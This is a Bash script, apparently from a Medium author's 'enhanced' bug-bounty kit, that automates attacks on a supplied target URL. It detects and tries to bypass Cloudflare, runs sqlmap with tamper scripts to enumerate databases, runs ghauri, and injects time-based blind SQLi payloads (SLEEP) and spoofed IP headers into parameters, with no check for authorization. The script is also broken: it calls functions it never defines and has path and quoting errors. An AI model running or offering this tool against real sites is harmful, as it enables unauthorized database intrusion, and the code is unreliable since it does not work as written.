#!/bin/bash

# Enhanced Bug Bounty Automation Script with Cloudflare Bypass and SQLi Testing
# Adds: Cloudflare checks, SQLi testing, header manipulation, recent bounty techniques
# New Dependencies: sqlmap, cf-check, ghauri, wafw00f, cloudflared

banner() {
cat <<'EOF'
 __     __                _                    
 \ \   / /__ _ __ _   _  | |    __ _ _____   _ 
  \ \ / / _ \ '__| | | | | |   / _` |_  / | | |
   \ V /  __/ |  | |_| | | |__| (_| |/ /| |_| |
    \_/ \___|_|   \__, | |_____\__,_/___|\__, |
           |___/                  |___/ 
__        __          ____             _    _   _      _     
\ \      / /_ _ _   _| __ )  __ _  ___| | _| | | |_ __| |___ 
 \ \ /\ / / _` | | | |  _ \ / _` |/ __| |/ / | | | '__| / __|
  \ V  V / (_| | |_| | |_) | (_| | (__|   <| |_| | |  | \__ \
   \_/\_/ \__,_|\__, |____/ \__,_|\___|_|\_\\___/|_|  |_|___/
                |___/                                        

                    @VeryLazyTech - Medium (Enhanced Edition)
EOF
}

set -eo pipefail

# Initialize variables
TARGET=""
WORKSPACE="results"
CONFIG_DIR="$HOME/.config/bbtools"
THREADS=20
NOTIFY=false
MODE="full"
CLOUDFLARE_BYPASS=false

usage() {
    echo "Usage: $0 --url <target> [--mode quick|full] [--notify]"
    echo "Options:"
    echo "  --mode     : Scan mode (quick/full) [default: full]"
    echo "  --notify   : Send notifications via notify CLI"
    exit 1
}

check_dependencies() {
    local deps=("waybackurls" "httpx" "nuclei" "subfinder" "amass" "ffuf" "gf" 
                "qsreplace" "subjs" "unfurl" "sqlmap" "cf-check" "ghauri" "wafw00f")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        echo "Missing dependencies: ${missing[*]}"
        exit 1
    fi
}

cloudflare_check() {
    echo "[+] Checking for Cloudflare protection..."
    if wafw00f -a "$TARGET" | grep -qi "Cloudflare"; then
        CLOUDFLARE_BYPASS=true
        echo "[!] Cloudflare detected - enabling bypass techniques"
        
        # Use cloudflared for tunneling
        echo "[+] Starting Cloudflare tunnel..."
        cloudflared tunnel --url http://localhost:8080 &> cf-tunnel.log &
        sleep 5
        
        # Check for Cloudflare bypass techniques
        cf-check -t "$TARGET" -o "$WORKSPACE/cf-bypass.txt"
    fi
}

sql_injection_scan() {
    echo "[+] Starting SQL injection testing..."
    mkdir -p "$WORKSPACE/sqli"
    
    # SQLMap with advanced bypass techniques
    sqlmap -u "$TARGET" --dbs --batch --time-sec 10 --level 3 --hex \
        --random-agent --tamper=space2comment,between,charencode \
        --flush-session --fresh-queries --output-dir="$WORKSPACE/sqli/sqlmap"
    
    # Ghauri advanced testing
    ghauri -u "$TARGET" --batch --threads $THREADS -o "$WORKSPACE/sqli/ghauri_results.txt"
    
    # Time-based blind testing
    echo "[+] Testing time-based blind SQLi..."
    for url in $(cat "$WORKSPACE/params.txt"); do
        {
            # Test standard time delay
            time_curl=$(curl -s -o /dev/null -w "%{time_total}" "$url%20AND%201=SLEEP(10)")
            if (( $(echo "$time_curl > 9" | bc -l) )); then
                echo "[!] Potential time-based SQLi at $url" | anew "$WORKSPACE/sqli/time_based.txt"
            fi
            
            # Test alternative payloads
            for i in {1..3}; do
                payload="%20AND%20(SELECT%20$i%20FROM%20(SELECT(SLEEP(10)))a)"
                time_curl=$(curl -s -o /dev/null -w "%{time_total}" "$url$payload")
                (( $(echo "$time_curl > 9" | bc -l) )) && \
                echo "[!] Potential time-based SQLi (payload $i) at $url" | anew "$WORKSPACE/sqli/time_based.txt"
            done
        } &
    done
    wait
    
    # Add recent bounty techniques
    echo "[+] Testing recent bounty tricks..."
    cat "$WORKSPACE/params.txt" | qsreplace -a | \
        xargs -P $THREADS -I {} bash -c "echo 'Testing {}'; \
        curl -s -k {} -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' \
        -H 'CF-Connecting_IP: 127.0.0.1' | egrep -io 'SQL syntax|database error'" | \
        anew "$WORKSPACE/sqli/error_based.txt"
}

vulnerability_scan() {
    echo "[+] Starting vulnerability scans..."
    
    if $CLOUDFLARE_BYPASS; then
        echo "[+] Using Cloudflare bypass techniques..."
        nuclei -l "$WORKSPACE/live_subs.txt" -t ~/nuclei-templates/cloudflare/ -severity critical -silent
    fi
    
    nuclei -l "$WORKSPACE/live_subs.txt" -t "$HOME/nuclei-templates/" -severity low,medium,high,critical -silent -o "$WORKSPACE/nuclei_results.txt"
    
    sql_injection_scan
    
    if [ "$MODE" = "full" ]; then
        echo "[+] Running full scan suite..."
        ffuf -w "$WORKSPACE/urls.txt" -u FUZZ -H "User-Agent: Mozilla/5.0" \
            -H "CF-Connecting-IP: 127.0.0.1" -t $THREADS -mc all -of csv -o "$WORKSPACE/ffuzz_results.csv"
        air -driver phantomjs -timeout 3 -concurrent $THREADS -i "$WORKSPACE/urls.txt" -o "$WORKSPACE/air_results.txt"
    fi
}

reporting() {
    echo "[+] Generating report..."
    echo "# Bug Bounty Report for $TARGET" > "$WORKSPACE/report.md"
    echo "## Subdomains\n\`\`\`" >> "$WORKSPACE/report.md"
    cat "$WORKSPACE/subs.txt" >> "$WORKSPACE/report.md"
    echo "\`\`\`\n## Vulnerabilities" >> "$WORKSPACE/report.md"
    cat "$WORKSPACE/nuclei_results.txt" >> "$WORKSPACE/report.md"
    
    echo "\n## SQL Injection Findings" >> "$WORKSPACE/report.md"
    [ -f "$WORKSPACE/sqli/time_based.txt" ] && echo "\n### Time-based Blind" >> "$WORKSPACE/report.md" && cat "$WORKSPACE/sqli/time_based.txt" >> "$WORKSPACE/report.md"
    [ -f "$WORKSPACE/sqli/error_based.txt" ] && echo "\n### Error-based" >> "$WORKSPACE/report.md" && cat "$WORKSPACE/sqli/error_based.txt" >> "$WORKSPACE/report.md"
    [ -f "$WORKSPACE/sqli/ghauri_results.txt" ] && echo "\n### Ghauri Findings" >> "$WORKSPACE/report.md" && cat "$WORKSPACE/sqli/ghauri_results.txt" >> "$WORKSPACE/report.md"
    
    echo "\`\`\`\n## JavaScript Findings" >> "$WORKSPACE/report.md"
    [ -f "$WORKSPACE/js_analysis/sensitive_js_data.txt" ] && cat "$WORKSPACE/js_analysis/sensitive_js_data.txt" >> "$WORKSPACE/report.md"
    
    if [ "$NOTIFY" = true ]; then
        echo "[+] Sending notifications..."
        cat "$WORKSPACE/nuclei_results.txt" "$WORKSPACE/sqli/*.txt" | notify -silent -bulk
    fi
}

main() {
    banner
    check_dependencies
    setup_environment
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            --url) TARGET="$2"; shift ;;
            --mode) MODE="$2"; shift ;;
            --notify) NOTIFY=true ;;
            *) usage ;;
        esac
        shift
    done

    [ -z "$TARGET" ] && usage
    
    cd "$WORKSPACE" || exit 1
    
    subdomain_enum
    cloudflare_check
    url_collection
    param_analysis
    vulnerability_scan
    reporting
    cleanup
    
    echo "[+] Scan complete! Results saved to $WORKSPACE/"
}

main "$@"
